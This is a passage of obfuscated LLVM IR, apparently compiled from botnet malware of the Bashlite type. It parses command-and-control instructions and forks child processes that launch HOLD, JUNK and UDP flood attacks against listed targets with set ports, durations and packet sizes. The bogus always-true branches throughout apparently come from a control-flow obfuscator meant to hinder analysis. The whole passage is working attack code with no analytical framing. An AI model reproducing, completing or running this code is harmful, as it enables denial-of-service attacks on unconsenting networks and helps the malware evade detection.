; <label>:314:                                    ; preds = %299
  %315 = load i8*, i8** %7, align 8
  %316 = call i8* @strtok(i8* %315, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %316, i8** %10, align 8
  br label %317

; <label>:317:                                    ; preds = %359, %314
  %318 = load i32, i32* @x.73
  %319 = load i32, i32* @y.74
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %317
  %326 = load i8*, i8** %10, align 8
  %327 = icmp ne i8* %326, null
  %328 = load i32, i32* @x.73
  %329 = load i32, i32* @y.74
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %327, label %336, label %361

; <label>:336:                                    ; preds = %originalBBpart244
  %337 = call i32 @listFork()
  %338 = icmp ne i32 %337, 0
  br i1 %338, label %359, label %339

; <label>:339:                                    ; preds = %336
  %340 = load i32, i32* @x.73
  %341 = load i32, i32* @y.74
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %339
  %348 = load i8*, i8** %10, align 8
  %349 = load i32, i32* %8, align 4
  %350 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %348, i32 %349, i32 %350)
  call void @_exit(i32 0) #12
  %351 = load i32, i32* @x.73
  %352 = load i32, i32* @y.74
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  unreachable

; <label>:359:                                    ; preds = %336
  %360 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %360, i8** %10, align 8
  br label %317

; <label>:361:                                    ; preds = %originalBBpart244
  br label %370

; <label>:362:                                    ; preds = %299
  %363 = call i32 @listFork()
  %364 = icmp ne i32 %363, 0
  br i1 %364, label %365, label %366

; <label>:365:                                    ; preds = %362
  br label %1178

; <label>:366:                                    ; preds = %362
  %367 = load i8*, i8** %7, align 8
  %368 = load i32, i32* %8, align 4
  %369 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %367, i32 %368, i32 %369)
  call void @_exit(i32 0) #12
  unreachable

; <label>:370:                                    ; preds = %361
  br label %371

; <label>:371:                                    ; preds = %370, %261
  %372 = load i8**, i8*** %4, align 8
  %373 = getelementptr inbounds i8*, i8** %372, i64 0
  %374 = load i8*, i8** %373, align 8
  %375 = call i32 @strcmp(i8* %374, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0)) #10
  %376 = icmp ne i32 %375, 0
  br i1 %376, label %483, label %377

; <label>:377:                                    ; preds = %371
  %378 = load i32, i32* %3, align 4
  %379 = icmp slt i32 %378, 4
  br i1 %379, label %392, label %380

; <label>:380:                                    ; preds = %377
  %381 = load i8**, i8*** %4, align 8
  %382 = getelementptr inbounds i8*, i8** %381, i64 2
  %383 = load i8*, i8** %382, align 8
  %384 = call i32 @atoi(i8* %383) #10
  %385 = icmp slt i32 %384, 1
  br i1 %385, label %392, label %386

; <label>:386:                                    ; preds = %380
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 3
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @atoi(i8* %389) #10
  %391 = icmp slt i32 %390, 1
  br i1 %391, label %392, label %409

; <label>:392:                                    ; preds = %386, %380, %377
  %393 = load i32, i32* @x.73
  %394 = load i32, i32* @y.74
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %392
  %401 = load i32, i32* @x.73
  %402 = load i32, i32* @y.74
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %1178

; <label>:409:                                    ; preds = %386
  %410 = load i8**, i8*** %4, align 8
  %411 = getelementptr inbounds i8*, i8** %410, i64 1
  %412 = load i8*, i8** %411, align 8
  store i8* %412, i8** %11, align 8
  %413 = load i8**, i8*** %4, align 8
  %414 = getelementptr inbounds i8*, i8** %413, i64 2
  %415 = load i8*, i8** %414, align 8
  %416 = call i32 @atoi(i8* %415) #10
  store i32 %416, i32* %12, align 4
  %417 = load i8**, i8*** %4, align 8
  %418 = getelementptr inbounds i8*, i8** %417, i64 3
  %419 = load i8*, i8** %418, align 8
  %420 = call i32 @atoi(i8* %419) #10
  store i32 %420, i32* %13, align 4
  %421 = load i8*, i8** %11, align 8
  %422 = call i8* @strstr(i8* %421, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #10
  %423 = icmp ne i8* %422, null
  br i1 %423, label %424, label %458

; <label>:424:                                    ; preds = %409
  %425 = load i8*, i8** %11, align 8
  %426 = call i8* @strtok(i8* %425, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %426, i8** %14, align 8
  br label %427

; <label>:427:                                    ; preds = %439, %424
  %428 = load i8*, i8** %14, align 8
  %429 = icmp ne i8* %428, null
  br i1 %429, label %430, label %441

; <label>:430:                                    ; preds = %427
  %431 = call i32 @listFork()
  %432 = icmp ne i32 %431, 0
  br i1 %432, label %439, label %433

; <label>:433:                                    ; preds = %430
  %434 = load i8*, i8** %14, align 8
  %435 = load i32, i32* %12, align 4
  %436 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %434, i32 %435, i32 %436)
  %437 = load i32, i32* @mainCommSock, align 4
  %438 = call i32 @close(i32 %437)
  call void @_exit(i32 0) #12
  unreachable

; <label>:439:                                    ; preds = %430
  %440 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %440, i8** %14, align 8
  br label %427

; <label>:441:                                    ; preds = %427
  %442 = load i32, i32* @x.73
  %443 = load i32, i32* @y.74
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %441
  %450 = load i32, i32* @x.73
  %451 = load i32, i32* @y.74
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %482

; <label>:458:                                    ; preds = %409
  %459 = call i32 @listFork()
  %460 = icmp ne i32 %459, 0
  br i1 %460, label %461, label %478

; <label>:461:                                    ; preds = %458
  %462 = load i32, i32* @x.73
  %463 = load i32, i32* @y.74
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %461
  %470 = load i32, i32* @x.73
  %471 = load i32, i32* @y.74
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %1178

; <label>:478:                                    ; preds = %458
  %479 = load i8*, i8** %11, align 8
  %480 = load i32, i32* %12, align 4
  %481 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %479, i32 %480, i32 %481)
  call void @_exit(i32 0) #12
  unreachable

; <label>:482:                                    ; preds = %originalBBpart256
  br label %483

; <label>:483:                                    ; preds = %482, %371
  %484 = load i8**, i8*** %4, align 8
  %485 = getelementptr inbounds i8*, i8** %484, i64 0
  %486 = load i8*, i8** %485, align 8
  %487 = call i32 @strcmp(i8* %486, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0)) #10
  %488 = icmp ne i32 %487, 0
  br i1 %488, label %778, label %489

; <label>:489:                                    ; preds = %483
  %490 = load i32, i32* %3, align 4
  %491 = icmp slt i32 %490, 6
  br i1 %491, label %585, label %492

; <label>:492:                                    ; preds = %489
  %493 = load i8**, i8*** %4, align 8
  %494 = getelementptr inbounds i8*, i8** %493, i64 3
  %495 = load i8*, i8** %494, align 8
  %496 = call i32 @atoi(i8* %495) #10
  %497 = icmp eq i32 %496, -1
  br i1 %497, label %585, label %498

; <label>:498:                                    ; preds = %492
  %499 = load i32, i32* @x.73
  %500 = load i32, i32* @y.74
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %498
  %507 = load i8**, i8*** %4, align 8
  %508 = getelementptr inbounds i8*, i8** %507, i64 2
  %509 = load i8*, i8** %508, align 8
  %510 = call i32 @atoi(i8* %509) #10
  %511 = icmp eq i32 %510, -1
  %512 = load i32, i32* @x.73
  %513 = load i32, i32* @y.74
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %511, label %585, label %520

; <label>:520:                                    ; preds = %originalBBpart264
  %521 = load i32, i32* @x.73
  %522 = load i32, i32* @y.74
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %520
  %529 = load i8**, i8*** %4, align 8
  %530 = getelementptr inbounds i8*, i8** %529, i64 4
  %531 = load i8*, i8** %530, align 8
  %532 = call i32 @atoi(i8* %531) #10
  %533 = icmp eq i32 %532, -1
  %534 = load i32, i32* @x.73
  %535 = load i32, i32* @y.74
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %533, label %585, label %542

; <label>:542:                                    ; preds = %originalBBpart268
  %543 = load i8**, i8*** %4, align 8
  %544 = getelementptr inbounds i8*, i8** %543, i64 5
  %545 = load i8*, i8** %544, align 8
  %546 = call i32 @atoi(i8* %545) #10
  %547 = icmp eq i32 %546, -1
  br i1 %547, label %585, label %548

; <label>:548:                                    ; preds = %542
  %549 = load i8**, i8*** %4, align 8
  %550 = getelementptr inbounds i8*, i8** %549, i64 5
  %551 = load i8*, i8** %550, align 8
  %552 = call i32 @atoi(i8* %551) #10
  %553 = icmp sgt i32 %552, 65500
  br i1 %553, label %585, label %554

; <label>:554:                                    ; preds = %548
  %555 = load i8**, i8*** %4, align 8
  %556 = getelementptr inbounds i8*, i8** %555, i64 4
  %557 = load i8*, i8** %556, align 8
  %558 = call i32 @atoi(i8* %557) #10
  %559 = icmp sgt i32 %558, 32
  br i1 %559, label %585, label %560

; <label>:560:                                    ; preds = %554
  %561 = load i32, i32* %3, align 4
  %562 = icmp eq i32 %561, 7
  br i1 %562, label %563, label %586

; <label>:563:                                    ; preds = %560
  %564 = load i32, i32* @x.73
  %565 = load i32, i32* @y.74
  %566 = sub i32 %564, 1
  %567 = mul i32 %564, %566
  %568 = urem i32 %567, 2
  %569 = icmp eq i32 %568, 0
  %570 = icmp slt i32 %565, 10
  %571 = or i1 %569, %570
  br i1 %571, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %563
  %572 = load i8**, i8*** %4, align 8
  %573 = getelementptr inbounds i8*, i8** %572, i64 6
  %574 = load i8*, i8** %573, align 8
  %575 = call i32 @atoi(i8* %574) #10
  %576 = icmp slt i32 %575, 1
  %577 = load i32, i32* @x.73
  %578 = load i32, i32* @y.74
  %579 = sub i32 %577, 1
  %580 = mul i32 %577, %579
  %581 = urem i32 %580, 2
  %582 = icmp eq i32 %581, 0
  %583 = icmp slt i32 %578, 10
  %584 = or i1 %582, %583
  br i1 %584, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %576, label %585, label %586

; <label>:585:                                    ; preds = %originalBBpart272, %554, %548, %542, %originalBBpart268, %originalBBpart264, %492, %489
  br label %1178

; <label>:586:                                    ; preds = %originalBBpart272, %560
  %587 = load i32, i32* @x.73
  %588 = load i32, i32* @y.74
  %589 = sub i32 %587, 1
  %590 = mul i32 %587, %589
  %591 = urem i32 %590, 2
  %592 = icmp eq i32 %591, 0
  %593 = icmp slt i32 %588, 10
  %594 = or i1 %592, %593
  br i1 %594, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %586
  %595 = load i8**, i8*** %4, align 8
  %596 = getelementptr inbounds i8*, i8** %595, i64 1
  %597 = load i8*, i8** %596, align 8
  store i8* %597, i8** %15, align 8
  %598 = load i8**, i8*** %4, align 8
  %599 = getelementptr inbounds i8*, i8** %598, i64 2
  %600 = load i8*, i8** %599, align 8
  %601 = call i32 @atoi(i8* %600) #10
  store i32 %601, i32* %16, align 4
  %602 = load i8**, i8*** %4, align 8
  %603 = getelementptr inbounds i8*, i8** %602, i64 3
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @atoi(i8* %604) #10
  store i32 %605, i32* %17, align 4
  %606 = load i8**, i8*** %4, align 8
  %607 = getelementptr inbounds i8*, i8** %606, i64 4
  %608 = load i8*, i8** %607, align 8
  %609 = call i32 @atoi(i8* %608) #10
  store i32 %609, i32* %18, align 4
  %610 = load i8**, i8*** %4, align 8
  %611 = getelementptr inbounds i8*, i8** %610, i64 5
  %612 = load i8*, i8** %611, align 8
  %613 = call i32 @atoi(i8* %612) #10
  store i32 %613, i32* %19, align 4
  %614 = load i32, i32* %3, align 4
  %615 = icmp eq i32 %614, 7
  %616 = load i32, i32* @x.73
  %617 = load i32, i32* @y.74
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %615, label %624, label %645

; <label>:624:                                    ; preds = %originalBBpart276
  %625 = load i32, i32* @x.73
  %626 = load i32, i32* @y.74
  %627 = sub i32 %625, 1
  %628 = mul i32 %625, %627
  %629 = urem i32 %628, 2
  %630 = icmp eq i32 %629, 0
  %631 = icmp slt i32 %626, 10
  %632 = or i1 %630, %631
  br i1 %632, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %624
  %633 = load i8**, i8*** %4, align 8
  %634 = getelementptr inbounds i8*, i8** %633, i64 6
  %635 = load i8*, i8** %634, align 8
  %636 = call i32 @atoi(i8* %635) #10
  %637 = load i32, i32* @x.73
  %638 = load i32, i32* @y.74
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %646

; <label>:645:                                    ; preds = %originalBBpart276
  br label %646

; <label>:646:                                    ; preds = %645, %originalBBpart280
  %647 = phi i32 [ %636, %originalBBpart280 ], [ 10, %645 ]
  store i32 %647, i32* %20, align 4
  %648 = load i8*, i8** %15, align 8
  %649 = call i8* @strstr(i8* %648, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #10
  %650 = icmp ne i8* %649, null
  br i1 %650, label %651, label %718

; <label>:651:                                    ; preds = %646
  %652 = load i8*, i8** %15, align 8
  %653 = call i8* @strtok(i8* %652, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %653, i8** %21, align 8
  br label %654

; <label>:654:                                    ; preds = %699, %651
  %655 = load i32, i32* @x.73
  %656 = load i32, i32* @y.74
  %657 = sub i32 %655, 1
  %658 = mul i32 %655, %657
  %659 = urem i32 %658, 2
  %660 = icmp eq i32 %659, 0
  %661 = icmp slt i32 %656, 10
  %662 = or i1 %660, %661
  br i1 %662, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %654
  %663 = load i8*, i8** %21, align 8
  %664 = icmp ne i8* %663, null
  %665 = load i32, i32* @x.73
  %666 = load i32, i32* @y.74
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %664, label %673, label %701

; <label>:673:                                    ; preds = %originalBBpart284
  %674 = call i32 @listFork()
  %675 = icmp ne i32 %674, 0
  br i1 %675, label %699, label %676

; <label>:676:                                    ; preds = %673
  %677 = load i32, i32* @x.73
  %678 = load i32, i32* @y.74
  %679 = sub i32 %677, 1
  %680 = mul i32 %677, %679
  %681 = urem i32 %680, 2
  %682 = icmp eq i32 %681, 0
  %683 = icmp slt i32 %678, 10
  %684 = or i1 %682, %683
  br i1 %684, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %676
  %685 = load i8*, i8** %21, align 8
  %686 = load i32, i32* %16, align 4
  %687 = load i32, i32* %17, align 4
  %688 = load i32, i32* %18, align 4
  %689 = load i32, i32* %19, align 4
  %690 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %685, i32 %686, i32 %687, i32 %688, i32 %689, i32 %690)
  call void @_exit(i32 0) #12
  %691 = load i32, i32* @x.73
  %692 = load i32, i32* @y.74
  %693 = sub i32 %691, 1
  %694 = mul i32 %691, %693
  %695 = urem i32 %694, 2
  %696 = icmp eq i32 %695, 0
  %697 = icmp slt i32 %692, 10
  %698 = or i1 %696, %697
  br i1 %698, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  unreachable

; <label>:699:                                    ; preds = %673
  %700 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %700, i8** %21, align 8
  br label %654

; <label>:701:                                    ; preds = %originalBBpart284
  %702 = load i32, i32* @x.73
  %703 = load i32, i32* @y.74
  %704 = sub i32 %702, 1
  %705 = mul i32 %702, %704
  %706 = urem i32 %705, 2
  %707 = icmp eq i32 %706, 0
  %708 = icmp slt i32 %703, 10
  %709 = or i1 %707, %708
  br i1 %709, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %701
  %710 = load i32, i32* @x.73
  %711 = load i32, i32* @y.74
  %712 = sub i32 %710, 1
  %713 = mul i32 %710, %712
  %714 = urem i32 %713, 2
  %715 = icmp eq i32 %714, 0
  %716 = icmp slt i32 %711, 10
  %717 = or i1 %715, %716
  br i1 %717, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %761

; <label>:718:                                    ; preds = %646
  %719 = load i32, i32* @x.73
  %720 = load i32, i32* @y.74
  %721 = sub i32 %719, 1
  %722 = mul i32 %719, %721
  %723 = urem i32 %722, 2
  %724 = icmp eq i32 %723, 0
  %725 = icmp slt i32 %720, 10
  %726 = or i1 %724, %725
  br i1 %726, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %718
  %727 = call i32 @listFork()
  %728 = icmp ne i32 %727, 0
  %729 = load i32, i32* @x.73
  %730 = load i32, i32* @y.74
  %731 = sub i32 %729, 1
  %732 = mul i32 %729, %731
  %733 = urem i32 %732, 2
  %734 = icmp eq i32 %733, 0
  %735 = icmp slt i32 %730, 10
  %736 = or i1 %734, %735
  br i1 %736, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %728, label %737, label %754

; <label>:737:                                    ; preds = %originalBBpart296
  %738 = load i32, i32* @x.73
  %739 = load i32, i32* @y.74
  %740 = sub i32 %738, 1
  %741 = mul i32 %738, %740
  %742 = urem i32 %741, 2
  %743 = icmp eq i32 %742, 0
  %744 = icmp slt i32 %739, 10
  %745 = or i1 %743, %744
  br i1 %745, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %737
  %746 = load i32, i32* @x.73
  %747 = load i32, i32* @y.74
  %748 = sub i32 %746, 1
  %749 = mul i32 %746, %748
  %750 = urem i32 %749, 2
  %751 = icmp eq i32 %750, 0
  %752 = icmp slt i32 %747, 10
  %753 = or i1 %751, %752
  br i1 %753, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %1178

; <label>:754:                                    ; preds = %originalBBpart296
  %755 = load i8*, i8** %15, align 8
  %756 = load i32, i32* %16, align 4
  %757 = load i32, i32* %17, align 4
  %758 = load i32, i32* %18, align 4
  %759 = load i32, i32* %19, align 4
  %760 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %755, i32 %756, i32 %757, i32 %758, i32 %759, i32 %760)
  call void @_exit(i32 0) #12
  unreachable

; <label>:761:                                    ; preds = %originalBBpart292
  %762 = load i32, i32* @x.73
  %763 = load i32, i32* @y.74
  %764 = sub i32 %762, 1
  %765 = mul i32 %762, %764
  %766 = urem i32 %765, 2
  %767 = icmp eq i32 %766, 0
  %768 = icmp slt i32 %763, 10
  %769 = or i1 %767, %768
  br i1 %769, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %761
  %770 = load i32, i32* @x.73
  %771 = load i32, i32* @y.74
  %772 = sub i32 %770, 1
  %773 = mul i32 %770, %772
  %774 = urem i32 %773, 2
  %775 = icmp eq i32 %774, 0
  %776 = icmp slt i32 %771, 10
  %777 = or i1 %775, %776
  br i1 %777, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %778

; <label>:778:                                    ; preds = %originalBBpart2104, %483
  %779 = load i32, i32* @x.73
  %780 = load i32, i32* @y.74
  %781 = sub i32 %779, 1
  %782 = mul i32 %779, %781
  %783 = urem i32 %782, 2
  %784 = icmp eq i32 %783, 0
  %785 = icmp slt i32 %780, 10
  %786 = or i1 %784, %785
  br i1 %786, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %778
  %787 = load i8**, i8*** %4, align 8
  %788 = getelementptr inbounds i8*, i8** %787, i64 0
  %789 = load i8*, i8** %788, align 8
  %790 = call i32 @strcmp(i8* %789, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i32 0, i32 0)) #10
  %791 = icmp ne i32 %790, 0
  %792 = load i32, i32* @x.73
  %793 = load i32, i32* @y.74
  %794 = sub i32 %792, 1
  %795 = mul i32 %792, %794
  %796 = urem i32 %795, 2
  %797 = icmp eq i32 %796, 0
  %798 = icmp slt i32 %793, 10
  %799 = or i1 %797, %798
  br i1 %799, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %791, label %1033, label %800

; <label>:800:                                    ; preds = %originalBBpart2108
  %801 = load i32, i32* %3, align 4
  %802 = icmp slt i32 %801, 6
  br i1 %802, label %893, label %803

; <label>:803:                                    ; preds = %800
  %804 = load i8**, i8*** %4, align 8
  %805 = getelementptr inbounds i8*, i8** %804, i64 3
  %806 = load i8*, i8** %805, align 8
  %807 = call i32 @atoi(i8* %806) #10
  %808 = icmp eq i32 %807, -1
  br i1 %808, label %893, label %809

; <label>:809:                                    ; preds = %803
  %810 = load i8**, i8*** %4, align 8
  %811 = getelementptr inbounds i8*, i8** %810, i64 2
  %812 = load i8*, i8** %811, align 8
  %813 = call i32 @atoi(i8* %812) #10
  %814 = icmp eq i32 %813, -1
  br i1 %814, label %893, label %815

; <label>:815:                                    ; preds = %809
  %816 = load i8**, i8*** %4, align 8
  %817 = getelementptr inbounds i8*, i8** %816, i64 4
  %818 = load i8*, i8** %817, align 8
  %819 = call i32 @atoi(i8* %818) #10
  %820 = icmp eq i32 %819, -1
  br i1 %820, label %893, label %821

; <label>:821:                                    ; preds = %815
  %822 = load i8**, i8*** %4, align 8
  %823 = getelementptr inbounds i8*, i8** %822, i64 4
  %824 = load i8*, i8** %823, align 8
  %825 = call i32 @atoi(i8* %824) #10
  %826 = icmp sgt i32 %825, 32
  br i1 %826, label %893, label %827

; <label>:827:                                    ; preds = %821
  %828 = load i32, i32* %3, align 4
  %829 = icmp sgt i32 %828, 6
  br i1 %829, label %830, label %852

; <label>:830:                                    ; preds = %827
  %831 = load i32, i32* @x.73
  %832 = load i32, i32* @y.74
  %833 = sub i32 %831, 1
  %834 = mul i32 %831, %833
  %835 = urem i32 %834, 2
  %836 = icmp eq i32 %835, 0
  %837 = icmp slt i32 %832, 10
  %838 = or i1 %836, %837
  br i1 %838, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %830
  %839 = load i8**, i8*** %4, align 8
  %840 = getelementptr inbounds i8*, i8** %839, i64 6
  %841 = load i8*, i8** %840, align 8
  %842 = call i32 @atoi(i8* %841) #10
  %843 = icmp slt i32 %842, 0
  %844 = load i32, i32* @x.73
  %845 = load i32, i32* @y.74
  %846 = sub i32 %844, 1
  %847 = mul i32 %844, %846
  %848 = urem i32 %847, 2
  %849 = icmp eq i32 %848, 0
  %850 = icmp slt i32 %845, 10
  %851 = or i1 %849, %850
  br i1 %851, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %843, label %893, label %852

; <label>:852:                                    ; preds = %originalBBpart2112, %827
  %853 = load i32, i32* @x.73
  %854 = load i32, i32* @y.74
  %855 = sub i32 %853, 1
  %856 = mul i32 %853, %855
  %857 = urem i32 %856, 2
  %858 = icmp eq i32 %857, 0
  %859 = icmp slt i32 %854, 10
  %860 = or i1 %858, %859
  br i1 %860, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %852
  %861 = load i32, i32* %3, align 4
  %862 = icmp eq i32 %861, 8
  %863 = load i32, i32* @x.73
  %864 = load i32, i32* @y.74
  %865 = sub i32 %863, 1
  %866 = mul i32 %863, %865
  %867 = urem i32 %866, 2
  %868 = icmp eq i32 %867, 0
  %869 = icmp slt i32 %864, 10
  %870 = or i1 %868, %869
  br i1 %870, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %862, label %871, label %894

; <label>:871:                                    ; preds = %originalBBpart2116
  %872 = load i32, i32* @x.73
  %873 = load i32, i32* @y.74
  %874 = sub i32 %872, 1
  %875 = mul i32 %872, %874
  %876 = urem i32 %875, 2
  %877 = icmp eq i32 %876, 0
  %878 = icmp slt i32 %873, 10
  %879 = or i1 %877, %878
  br i1 %879, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %871
  %880 = load i8**, i8*** %4, align 8
  %881 = getelementptr inbounds i8*, i8** %880, i64 7
  %882 = load i8*, i8** %881, align 8
  %883 = call i32 @atoi(i8* %882) #10
  %884 = icmp slt i32 %883, 1
  %885 = load i32, i32* @x.73
  %886 = load i32, i32* @y.74
  %887 = sub i32 %885, 1
  %888 = mul i32 %885, %887
  %889 = urem i32 %888, 2
  %890 = icmp eq i32 %889, 0
  %891 = icmp slt i32 %886, 10
  %892 = or i1 %890, %891
  br i1 %892, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %884, label %893, label %894

